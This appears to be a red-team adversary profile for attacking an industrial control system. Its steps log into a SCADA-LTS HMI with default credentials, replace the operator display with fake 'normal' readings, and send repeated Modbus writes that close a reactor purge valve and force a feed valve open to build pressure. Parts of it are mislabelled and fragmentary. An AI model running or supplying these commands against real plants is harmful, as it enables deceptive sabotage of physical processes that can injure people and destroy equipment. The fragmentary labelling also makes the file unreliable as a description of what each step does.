ability.technique_name: Indicator Removal on Host: Clear Command History
ability.name: Avoid logs

steps.command: curl -s -c /tmp/hmi_cookies.txt -d "username=admin&password=admin" "http://192.168.90.107:8080/login.htm" -o /tmp/hmi_login.html -w "%{http_code}" && echo "HTTP_STATUS:" && curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/data_point_details.shtm" -o /tmp/hmi_check.html && grep -qi "data\|point\|scada\|watch" /tmp/hmi_check.html && echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"
steps.plaintext_command: curl -s -c /tmp/hmi_cookies.txt -d "username=admin&password=admin" "http://192.168.90.107:8080/login.htm" -o /tmp/hmi_login.html -w "%{http_code}" && echo "HTTP_STATUS:" && curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/data_point_details.shtm" -o /tmp/hmi_check.html && grep -qi "data\|point\|scada\|watch" /tmp/hmi_check.html && echo "HMI_LOGIN_SUCCESS" || echo "HMI_LOGIN_FAILED"

level data points, raising thresholds so high that no alarm
will ever trigger during the attack.

steps.plaintext_command: HMI="http://192.168.90.107:8080/ScadaBR" && curl -s -b /tmp/hmi.jar "$HMI/api/views" -o /tmp/views.json && echo "Current views captured." && curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/views/1" -H "Content-Type: application/json" -d '{"components":[{"script":"return \"2450.0 kPa\""},     {"script":"return \"65.0%\""},     {"script":"return \"NORMAL\""}]}'2>/dev/null && echo "VIEW_MANIPULATED: Operators now see false-normal values"
steps.description:
Modify the TenEastView1 graphical view in SCADA-LTS to display
static "normal" values by changing JavaScript formatters in the
ScriptComponents to return hardcoded safe values instead of live data.
steps.name: SCADA-LTS - Manipulate Operator View

output.stdout: Current views captured.VIEW_MANIPULATED: Operators now see false-normal values

steps.command: for i in $(seq 1 50); do  ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;  sleep 0.1;done
steps.plaintext_command: for i in $(seq 1 50); do  ./modbus_cli 192.168.95.12 --port 502 write_r 1 0;  sleep 0.1;done
steps.description:
Write holding register 1 on Purge device (192.168.95.12) to 0,
forcing the purge valve fully closed. This traps gas in the reactor,
causing pressure to build.
steps.name: Modbus - Close Purge Valve

steps.command: for i in $(seq 1 50); do  ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;  sleep 0.1;done
steps.plaintext_command: for i in $(seq 1 50); do  ./modbus_cli 192.168.95.10 --port 502 write_r 1 65535;  sleep 0.1;done
steps.description:
Write holding register 1 on Feed 1 device (192.168.95.10) to 65535,
forcing maximum inflow. Combined with purge closure, this rapidly
increases reactor pressure.
steps.name: Modbus - Force Feed 1 Valve Open

adversary.name: HMI View Manipulation and Alarm Defeat Adversary
adversary.description:
APT-style operator deception chain. Compromises SCADA-LTS HMI,
exfiltrates operational data, disables alarms, and manipulates
the graphical view to show false-normal values while the process
is under attack.

objectives.name: default
objectives.description: This is a default objective that runs forever.
